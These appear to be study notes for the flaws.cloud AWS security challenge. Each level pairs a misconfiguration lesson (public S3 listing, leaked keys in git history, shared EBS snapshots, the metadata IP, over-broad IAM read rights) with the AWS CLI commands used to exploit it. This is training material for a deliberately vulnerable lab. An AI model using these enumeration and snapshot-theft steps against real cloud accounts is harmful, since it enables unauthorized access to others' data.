# flaws.cloud

## Public bucket listings
- By default, S3 buckets are private and secure when they are created. 
- To allow it to be accessed as a web page, I had turn on "Static Website Hosting" and changed the bucket policy to allow everyone `s3:GetObject` privileges, which is fine if you plan to publicly host the bucket as a web page. 
- But then to introduce the flaw, I changed the permissions to add "Everyone" to have "List" permissions.
- `dig +nocmd flaws.cloud any +multiline +noall +answer`
- `nslookup 54.231.184.255`
- `aws s3 ls  s3://flaws.cloud/ --no-sign-request --region us-west-2`

## S3 Permissions open to any authenticated AWS user
- Only open permissions to specific AWS users.
- `aws s3 --profile YOUR_ACCOUNT ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud`

## Must revoke leaked AWS keys
- Ref. Instagram's Million Dollar Bug
- Can't restrict the ability to list only certain buckets on AWS.
- Roll your secrets as often as possible.
- `aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ . --no-sign-request --region us-west-2`
- `git log`
- `git checkout f52ec03b227ea6094b04e43f475fb0126edb5a61`
- `aws configure --profile flaws`
- `aws --profile flaws s3 ls`

## Protect your backups
- AWS allows you to make snapshots of EC2's and databases (RDS).
- The main purpose for that is to make backups, but people sometimes use snapshots to get access back to their own EC2's when they forget the passwords. This also allows attackers to get access to things.
- Snapshots are normally restricted to your own account, so a possible attack would be an attacker getting access to an AWS key that allows them to start/stop and do other things with EC2's and then uses that to snapshot an EC2 and spin up an EC2 with that volume in your environment to get access to it.
- `aws --profile flaws sts get-caller-identity`
- `aws --profile flaws  ec2 describe-snapshots --owner-id 975426262029 --region us-west-2`
- `aws --profile YOUR_ACCOUNT ec2 create-volume --availability-zone us-west-2a --region us-west-2  --snapshot-id  snap-0b49342abd1bdcb89`
- `ssh -i YOUR_KEY.pem  ubuntu@ec2-54-191-240-80.us-west-2.compute.amazonaws.com`
- `lsblk`
- `sudo file -s /dev/xvdb1`
- `sudo mount /dev/xvdb1 /mnt`
- `find /mnt -type f -mtime -1 2>/dev/null | grep -v "/var/" | grep -v "/proc/" | grep -v "/dev/" | grep -v "/sys/" | grep -v "/run/" | less`

## Magic IP
- `169.254.169.254` is a IP that AWS uses to allow cloud resources to find out metadata about themselves.
- Ensure your applications do not allow access to 169.254.169.254 or any local and private IP ranges. 
- Additionally, ensure that IAM roles are restricted as much as possible.

## Misconfigured permissions
- It is common to give people and entities read-only permissions such as the SecurityAudit policy.
- The ability to read your own and other's IAM policies can really help an attacker figure out what exists in your environment and look for weaknesses and mistakes.
- Don't hand out any permissions liberally, even permissions that only let you read meta-data or know what your permissions are.
- `aws --profile level6 iam get-user`
- `aws --profile level6 iam list-attached-user-policies --user-name Level6`
- `aws --profile level6 iam get-policy  --policy-arn arn:aws:iam::975426262029:policy/list_apigateways`
- ` aws --profile level6 iam get-policy-version  --policy-arn arn:aws:iam::975426262029:policy/list_apigateways --version-id v4`
- `aws --region us-west-2 --profile level6 lambda list-functions`
- `aws --region us-west-2 --profile level6 lambda get-policy --function-name Level6`
- `aws --profile level6 --region us-west-2 apigateway get-stages --rest-api-id "s33ppypa75"`
